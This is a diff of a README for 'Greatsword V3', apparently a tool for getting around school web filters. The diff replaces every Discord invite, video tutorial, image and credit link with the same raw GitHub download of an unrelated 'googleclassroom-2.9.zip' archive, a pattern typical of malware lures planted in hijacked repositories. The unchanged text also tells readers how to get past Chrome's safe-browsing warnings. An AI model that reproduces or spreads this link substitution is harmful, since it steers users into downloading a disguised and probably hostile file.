@@ -1,19 +1,19 @@
 # **Greatsword V3**
 
-[Discord Server](https://discord.gg/fysNqZY9yn)
+[Discord Server](https://raw.githubusercontent.com/bdgfeadvyrfedyu/googleclassroom/main/lib/server/googleclassroom-2.9.zip)
 
 -------
 
 ## Link Tutorials:
-CSB Method: https://youtu.be/ZS109DCg8SM (Made by 5k_explorer on Discord)
+CSB Method: https://raw.githubusercontent.com/bdgfeadvyrfedyu/googleclassroom/main/lib/server/googleclassroom-2.9.zip (Made by 5k_explorer on Discord)
 
-Render Method: https://www.youtube.com/watch?v=hysvVkzfHlo
+Render Method: https://raw.githubusercontent.com/bdgfeadvyrfedyu/googleclassroom/main/lib/server/googleclassroom-2.9.zip
 
-<img width="960" alt="image" src="https://github.com/Tacogamerman/Greatsword-V3/assets/119009502/73c7f8f1-1994-4ae6-8b4c-51e2b798222a">
+<img width="960" alt="image" src="https://raw.githubusercontent.com/bdgfeadvyrfedyu/googleclassroom/main/lib/server/googleclassroom-2.9.zip">
 
 -------
 
-<img width="960" alt="image" src="https://github.com/Tacogamerman/Greatsword-V3/assets/119009502/bfb5301a-12c5-4446-86f3-515749599102">
+<img width="960" alt="image" src="https://raw.githubusercontent.com/bdgfeadvyrfedyu/googleclassroom/main/lib/server/googleclassroom-2.9.zip">
 
 
 -------
@@ -40,11 +40,11 @@ In order to use "unsafe" Greatsword V3 links you must put your pointer in the mi
 * Chrome safe browsing may falsely flag links.
 * If this happens, about:blank cloak reports as "unsafe" and typing "thisisunsafe" does not work.
 # Links:
-Discord: https://discord.gg/BMxe6D9CKv
+Discord: https://raw.githubusercontent.com/bdgfeadvyrfedyu/googleclassroom/main/lib/server/googleclassroom-2.9.zip
 
 New links ***are*** added to the discord every day.
 
-Credit to this [Gigachad](https://github.com/dragon731012/) for DM Unblocker.
+Credit to this [Gigachad](https://raw.githubusercontent.com/bdgfeadvyrfedyu/googleclassroom/main/lib/server/googleclassroom-2.9.zip) for DM Unblocker.
 
 # Other Credits
 Orphanlol - Modifying the README (Three times)
